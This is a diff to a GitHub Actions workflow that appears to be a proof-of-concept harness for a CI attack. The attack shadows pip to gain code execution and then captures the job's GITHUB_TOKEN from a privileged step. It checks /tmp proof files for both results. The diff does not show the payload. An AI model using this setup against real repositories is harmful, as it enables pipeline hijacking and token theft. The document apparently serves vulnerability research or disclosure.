@@ -39,15 +39,27 @@ jobs:
           echo "== after extraction:"
           echo "cwd=$(pwd)"
           ls -la .
-          echo "parent:"; ls -la ..
-          echo "workspace root pip dir?"; ls -la "$GITHUB_WORKSPACE/pip" 2>&1 || true
+          echo "----- workspace root -----"
+          ls -la "$GITHUB_WORKSPACE"
+          echo "----- pip dir? -----"
+          ls -la "$GITHUB_WORKSPACE/pip" 2>&1 || true
 
       - name: Install Python dependencies (exact target composite command)
         run: |
-          python3 -m pip install -r /dev/null || echo "pip command returned $?"
+          python3 -m pip install -r /dev/null
+
+      - name: Later privileged step (carries the job token, like the publish step)
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "privileged step with token env running"
+          sleep 30
+          echo "privileged step done"
 
       - name: Proof of code execution
         if: always()
         run: |
-          echo "--- proof file ---"
+          echo "--- pip shadow proof ---"
           cat /tmp/gab_pip_pwn.txt 2>&1 || echo NO_PROOF
+          echo "--- token capture proof (prefix only) ---"
+          cat /tmp/gab_tok_pwn.txt 2>&1 || echo NO_TOKEN_PROOF
